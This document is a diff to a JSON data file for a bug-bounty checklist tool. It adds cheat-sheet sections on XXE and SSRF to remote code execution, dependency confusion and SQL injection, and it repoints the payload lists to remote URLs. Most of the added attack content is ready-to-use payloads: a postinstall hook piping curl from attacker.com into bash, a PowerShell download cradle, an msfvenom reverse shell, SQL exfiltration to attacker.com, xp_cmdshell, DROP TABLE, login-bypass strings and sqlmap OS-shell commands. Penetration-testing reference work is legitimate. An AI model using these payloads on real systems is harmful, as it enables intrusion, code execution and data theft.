+              "type": "header",
+              "level": 3,
+              "text": "7. XXE to RCE"
+            },
+            {
+              "type": "checklist",
+              "text": "PHP Expect Module",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "xml",
+              "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]>\n<foo>&xxe;</foo>"
+            },
+            {
+              "type": "checklist",
+              "text": "SMB Relay (Linux)",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "xml",
+              "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"smb://ATTACKER_IP/share\">]>\n<foo>&xxe;</foo>"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "8. SSRF to RCE"
+            },
+            {
+              "type": "checklist",
+              "text": "Cloud Metadata Exploitation",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# AWS EC2 Metadata\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/user-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# Azure Metadata\nhttp://169.254.169.254/metadata/instance?api-version=2021-01-01\n\n# Google Cloud\nhttp://metadata.google.internal/computeMetadata/v1/\n\n# If you get AWS keys, create IAM user or access S3"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "9. Dependency Confusion"
+            },
+            {
+              "type": "checklist",
+              "text": "npm/yarn/pip Package Hijacking",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "javascript",
+              "code": "# package.json\n{\n  \"name\": \"@company/internal-package\",\n  \"version\": \"999.999.9999\",\n  \"scripts\": {\n    \"postinstall\": \"curl http://attacker.com/shell.sh | bash\"\n  }\n}\n\n# Publish to public npm with same name but higher version"
+            },
+            {
+              "type": "header",
+              "level": 2,
+              "text": "Tools & References"
+            },
+            {
+              "type": "links",
+              "urls": [
+                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection",
+                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization",
+                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+              ]
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Metasploit for quick shells\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php\n\n# Nishang for PowerShell\n# Download and execute\npowershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\""
             }
           ]
         }
@@ -4209,13 +4260,313 @@
     },
     {
       "id": "sql-injection",
-      "name": "Sql injection",
+      "name": "SQL Injection",
       "icon": "🗄️",
       "items": [
         {
-          "id": "sql-payloads",
-          "name": "SQL Injection Payloads",
-          "type": "payloads"
+          "id": "sql-injection",
+          "name": "SQL Injection Techniques",
+          "type": "content",
+          "content": [
+            {
+              "type": "header",
+              "level": 2,
+              "text": "SQL Injection Types"
+            },
+            {
+              "type": "text",
+              "text": "SQL injection allows attackers to manipulate queries to access/modify database data or execute commands on the server."
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Error-Based SQL Injection"
+            },
+            {
+              "type": "text",
+              "text": "Exploits error messages returned by the database to extract information about the structure."
+            },
+            {
+              "type": "checklist",
+              "text": "Basic Error Detection",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "' OR 1=1 --\n' OR 1=1 #\n' OR '1'='1\n\" OR 1=1 --\n\" OR \"1\"=\"1"
+            },
+            {
+              "type": "checklist",
+              "text": "MySQL Error-Based Payloads",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND(0)*2))) HAVING MIN(0) OR 1--\n' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--\n' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+            },
+            {
+              "type": "checklist",
+              "text": "PostgreSQL Error-Based Payloads",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "',cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)--\n',cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+0)||chr(126)+as+nUmeRiC)--"
+            },
+            {
+              "type": "checklist",
+              "text": "MSSQL Error-Based Payloads",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "'; EXEC xp_cmdshell('whoami')--\n'; SELECT convert(int,(SELECT @@version))--\n'; SELECT cast((SELECT @@version) as int)--"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "UNION-Based SQL Injection"
+            },
+            {
+              "type": "text",
+              "text": "Uses UNION operator to combine results from multiple SELECT statements."
+            },
+            {
+              "type": "checklist",
+              "text": "Column Detection",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\n# Continue until error"
+            },
+            {
+              "type": "checklist",
+              "text": "NULL-based UNION Detection",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n# Continue until no error"
+            },
+            {
+              "type": "checklist",
+              "text": "Database Enumeration (MySQL)",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "' UNION SELECT 1,2,3--\n' UNION SELECT user(),database(),version()--\n' UNION SELECT table_name FROM information_schema.tables--\n' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--\n' UNION SELECT username,password FROM users--"
+            },
+            {
+              "type": "checklist",
+              "text": "PostgreSQL Enumeration",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "' UNION SELECT 1,datname,3 FROM pg_database--\n' UNION SELECT 1,tablename,3 FROM pg_tables--\n' UNION SELECT 1,column_name,3 FROM information_schema.columns--"
+            },
+            {
+              "type": "checklist",
+              "text": "MSSQL Enumeration",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "' UNION SELECT 1,name,3 FROM master.dbo.sysdatabases--\n' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--\n' UNION SELECT 1,COLUMN_NAME,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Boolean-Based Blind SQL Injection"
+            },
+            {
+              "type": "text",
+              "text": "Uses TRUE/FALSE conditions to infer information when no direct output is visible."
+            },
+            {
+              "type": "checklist",
+              "text": "Basic Boolean Payloads",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "' AND 1=1--\n' AND 1=2--\n' OR '1'='1\n' OR 1=1 LIMIT 1--"
+            },
+            {
+              "type": "checklist",
+              "text": "Character Extraction",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "' AND (SELECT ASCII(SUBSTRING((SELECT user()),1,1)))>64--\n' AND (SELECT SUBSTRING(version(),1,1))='5'--\n' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'"
+            },
+            {
+              "type": "checklist",
+              "text": "Database Existence Check",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "' AND (SELECT COUNT(*) FROM users)>0--\n' AND EXISTS(SELECT 1 FROM users WHERE username='admin')--"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Time-Based Blind SQL Injection"
+            },
+            {
+              "type": "text",
+              "text": "Uses database delays to infer TRUE/FALSE conditions when no response difference is visible."
+            },
+            {
+              "type": "checklist",
+              "text": "MySQL Time-Based",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "'; SLEEP(5)--\n'; SELECT pg_sleep(5)--\n' AND SLEEP(5)--\n' AND (SELECT BENCHMARK(10000000,MD5('test')))--\n' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--"
+            },
+            {
+              "type": "checklist",
+              "text": "PostgreSQL Time-Based",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "'; SELECT pg_sleep(5)--\n' AND (SELECT pg_sleep(5) FROM users WHERE username='admin')IS NOT NULL--"
+            },
+            {
+              "type": "checklist",
+              "text": "MSSQL Time-Based",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "'; WAITFOR DELAY '00:00:05'--\n'; IF(1=1) WAITFOR DELAY '00:00:05'--\n'; SELECT COUNT(*) FROM users; WAITFOR DELAY '00:00:05'--"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Stacked Queries (Second-Order)"
+            },
+            {
+              "type": "text",
+              "text": "Execute multiple SQL statements by appending after the original query."
+            },
+            {
+              "type": "checklist",
+              "text": "MySQL Stacked Queries",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "'; DROP TABLE users--\n'; INSERT INTO users (username,password) VALUES ('hacker','pass')--\n'; UPDATE users SET password='hacked' WHERE username='admin'--"
+            },
+            {
+              "type": "checklist",
+              "text": "MSSQL Extended Procedures",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "'; EXEC xp_cmdshell('whoami')--\n'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--\n'; EXEC xp_cmdshell('net user');--"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Out-of-Band (OOB) SQL Injection"
+            },
+            {
+              "type": "text",
+              "text": "Exfiltrates data through separate channels like DNS, HTTP requests."
+            },
+            {
+              "type": "checklist",
+              "text": "DNS Exfiltration (MySQL)",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "'; SELECT LOAD_FILE('\\\\attacker.com\\\\file')--\n'; SELECT * FROM users INTO OUTFILE '/var/www/html/shell.php'--"
+            },
+            {
+              "type": "checklist",
+              "text": "HTTP Request Exfiltration",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "'; SELECT UTL_HTTP.request('http://attacker.com/?data='||password) FROM users--\n'; SELECT DBMS_LDAP.INIT(('attacker.com||'||password) FROM users)--"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Authentication Bypass Payloads"
+            },
+            {
+              "type": "checklist",
+              "text": "Login Bypass Payloads",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "admin' OR '1'='1\nadmin' OR 1=1--\nadmin' OR '1'='1'--\nadmin' OR '1'='1'#\n' OR 1=1 --\n' OR 1=1 LIMIT 1--\n\" OR 1=1 --\n1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055"
+            },
+            {
+              "type": "header",
+              "level": 2,
+              "text": "SQL Injection Tools"
+            },
+            {
+              "type": "links",
+              "urls": [
+                "https://github.com/sqlmapproject/sqlmap",
+                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+              ]
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Basic sqlmap scan\nsqlmap -u \"http://target.com/?id=1\" --batch\n\n# With cookies and POST data\nsqlmap -u \"http://target.com/login\" --data \"username=admin&password=*\" --cookie=\"PHPSESSID=xxx\"\n\n# Full database takeover\nsqlmap -u \"http://target.com/?id=1\" --dump --all\n\n# OS shell access\nsqlmap -u \"http://target.com/?id=1\" --os-shell\n\n# Custom tamper scripts for WAF bypass\nsqlmap -u \"http://target.com/?id=1\" --tamper=space2comment,charencode"
+            },
+            {
+              "type": "header",
+              "level": 2,
+              "text": "Prevention & References"
+            },
+            {
+              "type": "links",
+              "urls": [
+                "https://portswigger.net/web-security/sql-injection",
+                "https://github.com/payloadbox/sql-injection-payload-list",
+                "https://sqlwiki.netspi.com"
+              ]
+            }
+          ]
         }
       ]
     },
@@ -4235,7 +4586,7 @@
             },
             {
               "type": "text",
-              "text": "When a user uploads an image in example.com, the uploaded image’s EXIF Geolocation Data does not gets stripped. As a result, anyone can get sensitive information of example.com users like their Geolocation, their Device information like Device Name, Version, Software & Software version used etc."
+              "text": "When a user uploads an image in example.com, the uploaded image's EXIF Geolocation Data does not gets stripped. As a result, anyone can get sensitive information of example.com users like their Geolocation, their Device information like Device Name, Version, Software & Software version used etc."
             },
             {
               "type": "text",
@@ -4248,7 +4599,7 @@
             },
             {
               "type": "technique",
-              "title": "There are lot of images having resolutions (i.e 1280 * 720 ) , and also whith different MB’s . <br>",
+              "title": "There are lot of images having resolutions (i.e 1280 * 720 ) , and also whith different MB's . <br>",
               "description": ""
             },
             {
@@ -4612,7 +4963,7 @@
             {
               "type": "code",
               "lang": "",
-              "code": "Here’s my last finding (P1)\n1- register account\n2- intercept request\n3- here’s the response in image so in “role” parameter we have ROLE_USER\nSo i don’t know what i can replace it to privilege my account to admin\n4- open source code and look in js files\n5-So in js files i user ctrl+F to search about “user_role” i found another value that’s called “admin_role”\n6- so i use match and replace to replace value’s\n7- boom privilege my account to admin account with full control"
+              "code": "Here's my last finding (P1)\n1- register account\n2- intercept request\n3- here's the response in image so in “role” parameter we have ROLE_USER\nSo i don't know what i can replace it to privilege my account to admin\n4- open source code and look in js files\n5-So in js files i user ctrl+F to search about “user_role” i found another value that's called “admin_role”\n6- so i use match and replace to replace value's\n7- boom privilege my account to admin account with full control"
             },
             {
               "type": "text",
@@ -6272,11 +6623,17 @@
       "icon": "⚠️",
       "items": [
         {
-          "id": "xss",
-          "name": "Cross-Site Scripting",
+          "id": "xss-payloads",
+          "name": "XSS Payloads",
           "type": "external-payloads",
-          "payloadFile": "xss.json",
-          "description": "XSS payloads loaded from external repository"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/master/payloads/xss.json",
+          "description": "XSS payloads loaded from external repository",
+          "links": [
+            {"text": "PayloadsAllTheThings - XSS", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"},
+            {"text": "PortSwigger Web Academy - XSS", "url": "https://portswigger.net/web-security/cross-site-scripting"},
+            {"text": "OWASP XSS Filter Evasion", "url": "https://owasp.org/www-community/xss-filter-evasion-cheatsheet"},
+            {"text": "XSS Cheat Sheet - Jackku-Tools", "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"}
+          ]
         }
       ]
     },
@@ -6286,11 +6643,17 @@
       "icon": "🔄",
       "items": [
         {
-          "id": "ssrf",
-          "name": "Server-Side Request Forgery",
+          "id": "ssrf-payloads",
+          "name": "SSRF Payloads",
           "type": "external-payloads",
-          "payloadFile": "ssrf.json",
-          "description": "SSRF payloads loaded from external repository"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/refs/heads/master/payloads/ssrf.json",
+          "description": "SSRF payloads loaded from external repository",
+          "links": [
+            {"text": "PayloadsAllTheThings - SSRF", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"},
+            {"text": "PortSwigger Web Academy - SSRF", "url": "https://portswigger.net/web-security/ssrf"},
+            {"text": "OWASP SSRF Prevention", "url": "https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf"},
+            {"text": "Assetnote Blind SSRF Chains", "url": "https://github.com/assetnote/blind-ssrf-chains"}
+          ]
         }
       ]
     },
@@ -6300,11 +6663,17 @@
       "icon": "📝",
       "items": [
         {
-          "id": "ssti",
-          "name": "Server-Side Template Injection",
+          "id": "ssti-payloads",
+          "name": "SSTI Payloads",
           "type": "external-payloads",
-          "payloadFile": "ssti.json",
-          "description": "SSTI payloads for template injection testing"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/refs/heads/master/payloads/ssti.json",
+          "description": "SSTI payloads loaded from external repository",
+          "links": [
+            {"text": "PayloadsAllTheThings - SSTI", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"},
+            {"text": "PortSwigger Web Academy - SSTI", "url": "https://portswigger.net/web-security/server-side-template-injection"},
+            {"text": "HackTricks - SSTI", "url": "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"},
+            {"text": "PayloadBox SSTI Payloads", "url": "https://github.com/payload-box/ssti-advanced-payload-list"}
+          ]
         }
       ]
     },
@@ -6314,11 +6683,17 @@
       "icon": "📄",
       "items": [
         {
-          "id": "xxe",
-          "name": "XML External Entity",
+          "id": "xxe-payloads",
+          "name": "XXE Payloads",
           "type": "external-payloads",
-          "payloadFile": "xxe.json",
-          "description": "XXE payloads for XML injection testing"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/refs/heads/master/payloads/xxe.json",
+          "description": "XXE payloads loaded from external repository",
+          "links": [
+            {"text": "PayloadsAllTheThings - XXE", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"},
+            {"text": "PortSwigger Web Academy - XXE", "url": "https://portswigger.net/web-security/xxe"},
+            {"text": "OWASP XXE Processing", "url": "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"},
+            {"text": "PayloadBox XXE Payloads", "url": "https://github.com/payload-box/xxe-injection-payload-list"}
+          ]
         }
       ]
     },
@@ -6328,11 +6703,17 @@
       "icon": "⌨️",
       "items": [
         {
-          "id": "cmd-injection",
-          "name": "Command Injection",
+          "id": "cmd-injection-payloads",
+          "name": "Command Injection Payloads",
           "type": "external-payloads",
-          "payloadFile": "command-injection.json",
-          "description": "OS command injection payloads"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/refs/heads/master/payloads/command-injection.json",
+          "description": "OS command injection payloads",
+          "links": [
+            {"text": "PayloadsAllTheThings - Command Injection", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"},
+            {"text": "Pentestmonkey Reverse Shell", "url": "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"},
+            {"text": "HackTricks - Command Injection", "url": "https://book.hacktricks.xyz/pentesting-web/command-injection"},
+            {"text": "PayloadsAllTheThings - Webshell", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Shell"}
+          ]
         }
       ]
     },
@@ -6342,11 +6723,17 @@
       "icon": "📂",
       "items": [
         {
-          "id": "path-traversal",
-          "name": "Path Traversal / LFI",
+          "id": "path-traversal-payloads",
+          "name": "Path Traversal Payloads",
           "type": "external-payloads",
-          "payloadFile": "path-traversal.json",
-          "description": "Path traversal and LFI payloads"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/refs/heads/master/payloads/path-traversal.json",
+          "description": "Path traversal and LFI payloads",
+          "links": [
+            {"text": "PayloadsAllTheThings - LFI", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LFI"},
+            {"text": "PortSwigger Web Academy - LFI", "url": "https://portswigger.net/web-security/file-inclusion"},
+            {"text": "HackTricks - LFI/RFI", "url": "https://book.hacktricks.xyz/pentesting-web/lfi-rfi"},
+            {"text": "PayloadsAllTheThings - File Inclusion", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"}
+          ]
         }
       ]
     },
@@ -6356,11 +6743,17 @@
       "icon": "🔀",
       "items": [
         {
-          "id": "open-redirect",
-          "name": "Open Redirect",
+          "id": "open-redirect-payloads",
+          "name": "Open Redirect Payloads",
           "type": "external-payloads",
-          "payloadFile": "open-redirect.json",
-          "description": "Open redirect payloads"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/refs/heads/master/payloads/open-redirect.json",
+          "description": "Open redirect payloads",
+          "links": [
+            {"text": "PayloadsAllTheThings - Open Redirect", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect"},
+            {"text": "PortSwigger Web Academy - Open Redirect", "url": "https://portswigger.net/web-security/url-redirection"},
+            {"text": "Bug Bounty Playbook - Open Redirect", "url": "https://blog.bugbountyjedi.com/2021/02/25/open-redirect-vulnerabilities/"},
+            {"text": "HackTricks - Open Redirect", "url": "https://book.hacktricks.xyz/pentesting-web/open-redirect"}
+          ]
         }
       ]
     },
@@ -6370,11 +6763,17 @@
       "icon": "🔷",
       "items": [
         {
-          "id": "graphql",
-          "name": "GraphQL Testing",
+          "id": "graphql-payloads",
+          "name": "GraphQL Payloads",
           "type": "external-payloads",
-          "payloadFile": "graphql.json",
-          "description": "GraphQL introspection and testing queries"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/refs/heads/master/payloads/graphql.json",
+          "description": "GraphQL introspection and testing queries",
+          "links": [
+            {"text": "PayloadsAllTheThings - GraphQL", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection"},
+            {"text": "BishopFox GraphQL Introspection", "url": "https://github.com/BishopFox/graphql-introspection"},
+            {"text": "DolevFarbi/GraphQLmap", "url": "https://github.com/DolevFarbi/GraphQLmap"},
+            {"text": "OWASP API Security - GraphQL", "url": "https://owasp.org/www-project-api-security/"}
+          ]
         }
       ]
     },
@@ -6384,11 +6783,17 @@
       "icon": "🎫",
       "items": [
         {
-          "id": "jwt-testing",
-          "name": "JWT Token Testing",
+          "id": "jwt-payloads",
+          "name": "JWT Payloads",
           "type": "external-payloads",
-          "payloadFile": "jwt.json",
-          "description": "JWT tokens and testing utilities"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/refs/heads/master/payloads/jwt.json",
+          "description": "JWT tokens and testing utilities",
+          "links": [
+            {"text": "PayloadsAllTheThings - JWT", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token"},
+            {"text": "PortSwigger Web Academy - JWT", "url": "https://portswigger.net/web-security/jwt"},
+            {"text": "ticarpi/jwt_tool", "url": "https://github.com/ticarpi/jwt_tool"},
+            {"text": "JWT.io Decoder", "url": "https://jwt.io/"}
+          ]
         }
       ]
     },
@@ -6398,11 +6803,16 @@
       "icon": "🏷️",
       "items": [
         {
-          "id": "html-injection",
-          "name": "HTML Injection",
+          "id": "html-injection-payloads",
+          "name": "HTML Injection Payloads",
           "type": "external-payloads",
-          "payloadFile": "html-injection.json",
-          "description": "HTML injection payloads"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/refs/heads/master/payloads/html-injection.json",
+          "description": "HTML injection payloads",
+          "links": [
+            {"text": "OWASP Testing Guide", "url": "https://owasp.org/www-project-web-security-testing-guide/"},
+            {"text": "HackTricks - HTML Injection", "url": "https://book.hacktricks.xyz/pentesting-web/html-injection"},
+            {"text": "PortSwigger - Web Security", "url": "https://portswigger.net/web-security"}
+          ]
         }
       ]
     },
@@ -6412,11 +6822,17 @@
       "icon": "📝",
       "items": [
         {
-          "id": "wordpress-testing",
-          "name": "WordPress Testing",
+          "id": "wordpress-payloads",
+          "name": "WordPress Payloads",
           "type": "external-payloads",
-          "payloadFile": "wordpress.json",
-          "description": "WordPress endpoints and paths"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/refs/heads/master/payloads/wordpress.json",
+          "description": "WordPress endpoints and paths",
+          "links": [
+            {"text": "WPScan - WordPress Scanner", "url": "https://wpscan.com/wordpress-security-scanner"},
+            {"text": "PayloadsAllTheThings - WordPress", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WordPress"},
+            {"text": "HackTricks - WordPress", "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress"},
+            {"text": "WPscan API - Vuln DB", "url": "https://wpscan.com/vulnerability-database"}
+          ]
         }
       ]
     },
@@ -6426,11 +6842,17 @@
       "icon": "🔍",
       "items": [
         {
-          "id": "bug-bounty-dorks",
+          "id": "bug-bounty-dorks-payloads",
           "name": "Bug Bounty Dorks",
           "type": "external-payloads",
-          "payloadFile": "bug-bounty-dorks.json",
-          "description": "Google dorks for finding bug bounty targets"
+          "url": "https://raw.githubusercontent.com/thisisdarkstar/BountyChecklist-Payloads/refs/heads/master/payloads/bug-bounty-dorks.json",
+          "description": "Google dorks for finding bug bounty targets",
+          "links": [
+            {"text": "Exploit-DB GHDB", "url": "https://www.exploit-db.com/google-hacking-database"},
+            {"text": "EdOverflow Bug Bounty Cheatsheet", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet"},
+            {"text": "Bug Bounty Methodology", "url": "https://www.bugbountyhunter.com/"},
+            {"text": "PayloadsAllTheThings - Bug Bounty Tips", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings"}
+          ]
         }
       ]
     }
